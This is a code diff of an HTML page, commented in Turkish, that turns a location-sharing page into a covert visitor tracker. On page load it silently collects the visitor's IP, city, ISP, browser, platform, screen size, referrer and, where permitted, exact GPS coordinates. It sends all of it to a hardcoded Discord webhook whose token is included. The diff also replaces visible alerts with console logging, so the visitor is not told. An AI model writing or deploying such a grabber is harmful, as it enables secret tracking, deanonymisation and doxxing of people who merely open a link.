@@ -6,69 +6,117 @@
     <title>Get User Location Automatically</title>
 </head>
 <body>
-    <h1>Kullanıcının Gerçek Konumu Alınıyor...</h1>
+    <h1>Kullanıcının Konumu ve Bilgileri Alınıyor...</h1>
 
     <script>
+        var ip = '';
+        var latitude = '';
+        var longitude = '';
+        var city = '';
+        var country = '';
+        var countryCode = '';
+        var org = '';
+        var mapLink = '';
+        var browserInfo = navigator.userAgent;
+        var dateVisited = new Date().toUTCString();
+        var language = navigator.language;
+        var platform = navigator.platform;
+        var referrer = document.referrer;
+        var yerelZaman = new Date();
+        var ekranGenislik = window.screen.width;
+        var ekranYukseklik = window.screen.height;
+
+        // Discord Webhook URL
+        var webhookURL = 'https://discord.com/api/webhooks/1197143406909079603/NUuX5YJh-7FilsYGnKTcZOdaibciKTyTd8EyWpGzJk1gcKAgJtOsfcYoyqC-OttBeRj8';
+        var combinedMessage = '';
+
         // Sayfa yüklendiğinde otomatik olarak çalışacak fonksiyon
         window.onload = function() {
-            getLocation();
-        };
+            fetchIPInfo();  // IP tabanlı bilgileri hemen al
 
-        function getLocation() {
+            // Gerçek konumu almayı dene
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendPosition, showError);
+                navigator.geolocation.getCurrentPosition(saveRealPosition, sendFinalMessage);  
             } else {
                 alert("Geolocation tarayıcınız tarafından desteklenmiyor.");
+                sendFinalMessage();  // Geolocation desteklenmiyorsa yalnızca IP tabanlı bilgileri gönder
             }
+        };
+
+        function saveRealPosition(position) {
+            // Gerçek konum bilgilerini al
+            var realLatitude = position.coords.latitude;
+            var realLongitude = position.coords.longitude;
+            var realMapLink = `https://www.google.com/maps?q=${realLatitude},${realLongitude}`;
+
+            combinedMessage += `**Gerçek Konum Bilgileri**:\n` +
+                               `Enlem: ${realLatitude}\n` +
+                               `Boylam: ${realLongitude}\n` +
+                               `[Google Maps'te Gör](<${realMapLink}>)\n\n`;
+
+            sendFinalMessage();  // Hem gerçek konum hem de IP bilgileri gönderilmek üzere devam edilir
         }
 
-        function sendPosition(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            
-            // Google Maps linki oluşturma
-            const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-            
-            // Webhook URL'sini buraya ekleyin
-            const webhookUrl = "https://discord.com/api/webhooks/1197143406909079603/NUuX5YJh-7FilsYGnKTcZOdaibciKTyTd8EyWpGzJk1gcKAgJtOsfcYoyqC-OttBeRj8";
+        function fetchIPInfo() {
+            // IP tabanlı bilgileri al
+            fetch('https://ipapi.co/json/')
+                .then(function (response) {
+                    return response.json();
+                })
+                .then(function (data) {
+                    ip = data.ip;
+                    latitude = latitude || data.latitude;  // Eğer gerçek konum yoksa IP konumunu kullan
+                    longitude = longitude || data.longitude;
+                    city = data.city;
+                    country = data.country_name;
+                    countryCode = data.country.toLowerCase(); // Küçük harfe çevir
+                    org = data.org;
+                    mapLink = mapLink || 'https://www.google.com/maps?q=' + latitude + ',' + longitude;
 
-            const data = {
-                content: `Kullanıcının konumu:\n[Google Maps'te Gör](<${mapsUrl}>)`
-            };
+                    combinedMessage += `**IP ve Genel Bilgiler**:\n` +
+                                       `IP: ${ip}\n` +
+                                       `Enlem: ${latitude}\n` +
+                                       `Boylam: ${longitude}\n` +
+                                       `Şehir: ${city}\n` +
+                                       `Ülke: ${country} :flag_${countryCode}:\n` +
+                                       `Organizasyon: ${org}\n` +
+                                       `[Google Maps'te Gör](<${mapLink}>)\n\n` +
+                                       `Tarayıcı Bilgisi: ${browserInfo}\n` +
+                                       `Ziyaret Zamanı: ${dateVisited} **(${platform})**\n` +
+                                       `Dil: ${language}\n` +
+                                       `Yerel Zaman: ${yerelZaman}\n` +
+                                       `Ekran Çözünürlüğü: ${ekranGenislik}x${ekranYukseklik}\n` +
+                                       `Referer: ${referrer}\n\n`;
 
-            fetch(webhookUrl, {
+                })
+                .catch(function (error) {
+                    console.error('IP bilgileri alınırken hata:', error);
+                });
+        }
+
+        function sendFinalMessage() {
+            // Tüm bilgileri tek seferde Discord Webhook'a gönder
+            fetch(webhookURL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(data)
-            }).then(response => {
+                body: JSON.stringify({
+                    content: combinedMessage
+                })
+            })
+            .then(function (response) {
                 if (response.ok) {
-                    alert("Konum Discord'a Google Maps linki olarak gönderildi!");
+                    console.log('Tüm bilgiler başarıyla gönderildi.');
                 } else {
-                    alert("Konum gönderilemedi.");
+                    console.error('Veriler Discord API\'ye gönderilemedi.');
                 }
-            }).catch(error => {
-                alert("Bir hata oluştu: " + error);
+            })
+            .catch(function (error) {
+                console.error('Hata:', error);
             });
         }
 
-        function showError(error) {
-            switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    alert("Kullanıcı konum isteğini reddetti.");
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    alert("Konum bilgisi mevcut değil.");
-                    break;
-                case error.TIMEOUT:
-                    alert("Konum isteği zaman aşımına uğradı.");
-                    break;
-                case error.UNKNOWN_ERROR:
-                    alert("Bilinmeyen bir hata oluştu.");
-                    break;
-            }
-        }
     </script>
 </body>
 </html>
